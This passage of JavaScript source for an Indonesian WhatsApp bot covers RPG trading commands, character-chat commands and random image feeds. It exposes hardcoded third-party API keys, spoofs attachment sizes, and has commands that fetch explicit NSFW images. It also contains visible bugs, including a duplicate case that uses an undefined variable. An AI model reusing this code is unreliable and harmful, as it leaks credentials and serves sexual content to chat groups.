if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 25 * jmlh
if (getEmas(m.sender) < jmlh) return reply(`Emas Anda Tidak Cukup`)
sellEmas(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Emas : 25\n ┊ Status : Sukses\n ┊ Sisa Emas : ${getEmas(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break 
case 'jelajah': {
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
addStone(m.sender, vio)
addIkan(m.sender, pikan)
znn.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) 
} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
addStone(m.sender, tesaaq)
addKayu(m.sender, ise)
znn.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 65)
addIkan(m.sender, feds)
znn.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
addOre(m.sender, fads)
addStone(m.sender, fids)
znn.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
addOre(m.sender, pore)
addStone(m.sender, pone)
znn.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
addStone(m.sender, tzys)
addKayu(m.sender, isue)
znn.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
addStone(m.sender, awqu)
addKayu(m.sender, usui)
znn.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river
`
znn.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
}
break
case 'jualikan':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIkan = 10000
const hasil1 = bayar * hargaIkan
if ( getMancingIkan(m.sender) <= 1 ) return reply(`Maaf ${pushname} ikan kamu belum cukup, minimal 2 ikan`)
if ( getMancingIkan(m.sender) >= 1 ) {
jualIkan(m.sender, bayar)
addKoinUser(m.sender, hasil1)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah ikan dijual:* ${bayar}${enter}*Uang didapat:* ${hasil1}${enter}${enter}*Sisa ikan:* ${getMancingIkan(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualcoal':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaCoal = 15000
const hasil2 = bayar * hargaCoal
if ( getMiningcoal(m.sender) <= 1 ) return reply(`Maaf ${pushname} kamu tidak punya coal`)
if ( getMiningcoal(m.sender) >= 1 ) {
jualcoal(m.sender, bayar)
addKoinUser(m.sender, hasil2)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'lebur':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaOre = 2
const hasil3 = bayar * hargaOre
if ( getMiningore(m.sender) <= 1 ) return reply(`Maaf ${pushname} ore kamu belum cukup, minimal 2 ore`)
if ( getMiningore(m.sender) >= 1 ) {
jualore(m.sender, bayar)
addIngot(m.sender, hasil3)
await reply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
}
}
break
case 'jualstone':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return reply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
addKoinUser(m.sender, hasil4)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualingot':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIngot = 35000
const hasil5 = bayar * hargaIngot
if ( getMiningingot(m.sender) <= 1 ) return reply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
if ( getMiningingot(m.sender) >= 1 ) {
jualingot(m.sender, bayar)
addKoinUser(m.sender, hasil5)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualkayu':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaKayu = 18000
const hasil6 = bayar * hargaKayu
if ( getNebangKayu(m.sender) <= 1 ) return reply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu`)
if ( getNebangKayu(m.sender) >= 1 ) {
jualkayu(m.sender, bayar)
addKoinUser(m.sender, hasil6)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await checkATMuser(m.sender)}`)
}
}
break
case 'nebang':{
setTimeout( () => {
const oreo = Math.ceil(Math.random() * 20)
addKayu(m.sender, oreo)
reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${oreo}*kayu selama 2 menit`)
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang menebang, silahkan tunggu...')
}, 0) //1sec
}
break
case 'goplanet':{
setTimeout( () => {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
addPlanet(m.sender, bertualang)
reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${bertualang} bahan kimia dari ${planetari}* selama 2 tahun`)
}, 2000); //2 minute
setTimeout( () => {
reply('Sedang meroket 😱, silahkan tunggu... 2 tahun')
}, 0) //1sec
}
break
case 'jualbahankimia':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
buayar= args.join(" ")
const hargakimia = 1000
const dapetin = buayar * hargakimia
if ( getBertualangPlanet(m.sender) <= 1 ) return reply(`maaf ${pushname} kamu tidak punya bahankimia`)
if ( getBertualangPlanet(m.sender) >= 1 ) {
jualbahankimia(m.sender, buayar)
addKoinUser(m.sender, dapetin)
await reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}${enter}${enter}`)
}
}
break



















//FITUR AI
case 'nobara': {
if (!text) return reply(`Example : ${command} hallo aku cinta kamu`)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/others/cai?q=${text}&text=nobara&apikey=Ceri`);
if (data.data && data.data.output) {
const caimsg = data.data.output;
znn.sendMessage(from, {
document: trash,
fileName: 'Powered By znn',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 999999999,
pageCount: '2024',
caption: `${caimsg}`,
contextInfo: {
externalAdReply: {  
title: `NOBARA AUTO AI`, 
body: 'znn project [beta]',
thumbnailUrl: "https://telegra.ph/file/b53b3b907d13a1924fbf2.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
}
break
case 'elaina': {
if (!text) return reply(`Example : ${command} hallo aku cinta kamu`)
  let ouh = await fetch(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=Elaina`)
  let gyh = await ouh.json() 
znn.sendMessage(from, {
document: trash,
fileName: 'Powered By znn',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 999999999,
pageCount: '2024',
caption: `${gyh.result}`,
contextInfo: {
externalAdReply: {  
title: `ELAINA AUTO AI`, 
body: 'znn project [beta]',
thumbnailUrl: "https://telegra.ph/file/d343889c1b2ab1de43031.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
break
case 'hutao': {
if (!text) return reply(`Example : ${command} siapakah elon musk`)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/others/cai?q=${text}&text=hutao&apikey=Ceri`);
if (data.data && data.data.output) {
const caimsg = data.data.output;
znn.sendMessage(from, {
document: trash,
fileName: 'Keteck Wangi Hutao',
mimetype: "docx",
fileLength: 999999999,
caption: `${caimsg}`,
contextInfo: {
externalAdReply: {  
title: `HUTAO AUTO AI`, 
body: 'znn project [beta]',
thumbnailUrl: "https://telegra.ph/file/9c457ae5e319593da5ddc.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
}
break
          case 'miku':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  let ouh = await fetch(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=miku`)
 //let ouh = await fetch(`https://api.betabotz.org/api/search/c-ai?prompt=hai%20ai%20siapa%20namamu?&char=HuTao&apikey=8cZTmd8U`)
  let gyh = ouh.json() 
  await znn.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Hatsume Miku - C.ai',
        body: 'meg',
        thumbnailUrl: 'https://telegra.ph/file/839a326d43474bf0242ec.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break
 case 'elaina':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  await znn.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Elaina - C.ai',
        body: 'meg',
        thumbnailUrl: 'https://telegra.ph/file/d343889c1b2ab1de43031.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break  
case 'nezuko':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  let ouh = await fetch(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=nezuko`)
  let gyh = await ouh.json() 
  await znn.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Nezuko - C.ai',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/fd03a32e284f69a67114c.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break
/*
case 'dalle':
if (!text) return reply('Input parameter text!')
var resop = await fetch(BASE_URL + `/dalle` + `?text=${encodeURIComponent(inputText)}`).then(response => response.buffer())       
var response = new MessageMedia((await fromBuffer(resop)).mime, resop.toString("base64"))
await znn.sendMessage(from, {image: response,caption: `Prompt: ${inputText}`})
break*/







































// FITUR ASUPAN
case 'tiktokgirl':
reply('Wet ngabs')
var asupan = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
reply('Wet ngabs')
var gheayubi = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
reply('Wet ngabs')
var bocil = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
reply('Wet ngabs')
var ukhty = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
reply('Wet ngabs')
var santuy = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
reply('Wet ngabs')
var kayes = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
reply('Wet ngabs')
var rikagusriani = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/kpop.json'))
var ll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/notnot.json'))
var lll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/car.json'))
var llll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/profile.json'))
var llllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/rose.json'))
var llllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./znnProject/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
znn.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
   let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :

reply('matte kudasai (눈‸눈)')
  let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
reply('matte kudasai (눈‸눈)')						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url:waifudd4.data.url } }, { quoted: m })
break  
case 'milf':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/milf.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break 
case 'animespank':						
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`)     
             znn.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/ahegao.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'ass':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/ass.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'bdsm':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/bdsm.json'))
var znnyresult = pickRandom(ahegaonsfw)
